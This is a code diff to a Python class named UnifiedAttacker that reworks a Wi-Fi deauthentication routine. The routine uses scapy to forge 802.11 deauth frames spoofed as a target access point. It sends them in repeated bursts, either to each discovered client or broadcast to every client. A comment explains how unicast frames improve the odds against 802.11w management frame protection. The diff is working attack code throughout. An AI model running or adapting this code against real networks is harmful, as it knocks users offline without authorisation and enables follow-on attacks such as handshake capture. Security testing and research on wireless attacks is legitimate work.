@@ -740,35 +740,57 @@ class UnifiedAttacker:
             pass
 
         def _send_deauth() -> None:
-            """Send broadcast + unicast deauth bursts (spoofed as the AP).
+            """Send deauth frames spoofed as the AP.
 
-            Broadcast deauth is silently dropped by clients with 802.11w MFP
-            active.  Unicast deauth to specific client MACs bypasses some
-            PMF-capable (non-required) implementations.
+            Unicast mode: one frame per discovered client MAC — targeted,
+            less disruptive, better chance against 802.11w MFP-capable APs.
+            Broadcast mode: one frame to ff:ff:ff:ff:ff:ff — reaches all
+            clients at once but disconnects everyone on the AP.
             """
             try:
-                dot11_bc = sc.Dot11(
-                    type=0, subtype=12,
-                    addr1="ff:ff:ff:ff:ff:ff",
-                    addr2=self.target.bssid,
-                    addr3=self.target.bssid,
-                )
-                frame_bc = sc.RadioTap() / dot11_bc / sc.Dot11Deauth(reason=7)
-                sc.sendp(frame_bc, iface=iface_for_send, count=32, inter=0.05, verbose=False)
-
-                clients_snapshot = list(discovered_clients) if self.unicast_deauth else []
-                for client_mac in clients_snapshot:
-                    dot11_uc = sc.Dot11(
+                if self.unicast_deauth:
+                    clients_snapshot = list(discovered_clients)
+                    if not clients_snapshot:
+                        # No clients discovered yet — fall back to broadcast
+                        # for this round so we don't send nothing.
+                        dot11 = sc.Dot11(
+                            type=0, subtype=12,
+                            addr1="ff:ff:ff:ff:ff:ff",
+                            addr2=self.target.bssid,
+                            addr3=self.target.bssid,
+                        )
+                        sc.sendp(
+                            sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                            iface=iface_for_send, count=32, inter=0.05, verbose=False,
+                        )
+                        self._log("Deauth burst sent (broadcast — no clients seen yet)", "info")
+                    else:
+                        for client_mac in clients_snapshot:
+                            dot11 = sc.Dot11(
+                                type=0, subtype=12,
+                                addr1=client_mac,
+                                addr2=self.target.bssid,
+                                addr3=self.target.bssid,
+                            )
+                            sc.sendp(
+                                sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                                iface=iface_for_send, count=32, inter=0.05, verbose=False,
+                            )
+                        self._log(
+                            f"Deauth burst sent (unicast to {len(clients_snapshot)} client(s))", "info"
+                        )
+                else:
+                    dot11 = sc.Dot11(
                         type=0, subtype=12,
-                        addr1=client_mac,
+                        addr1="ff:ff:ff:ff:ff:ff",
                         addr2=self.target.bssid,
                         addr3=self.target.bssid,
                     )
-                    frame_uc = sc.RadioTap() / dot11_uc / sc.Dot11Deauth(reason=7)
-                    sc.sendp(frame_uc, iface=iface_for_send, count=16, inter=0.05, verbose=False)
-
-                client_info = f" + unicast to {len(clients_snapshot)} client(s)" if clients_snapshot else ""
-                self._log(f"Deauth burst sent (broadcast{client_info})", "info")
+                    sc.sendp(
+                        sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                        iface=iface_for_send, count=64, inter=0.05, verbose=False,
+                    )
+                    self._log("Deauth burst sent (broadcast)", "info")
             except Exception as exc:
                 self._log(f"Deauth failed (non-fatal): {exc}", "warn")
 
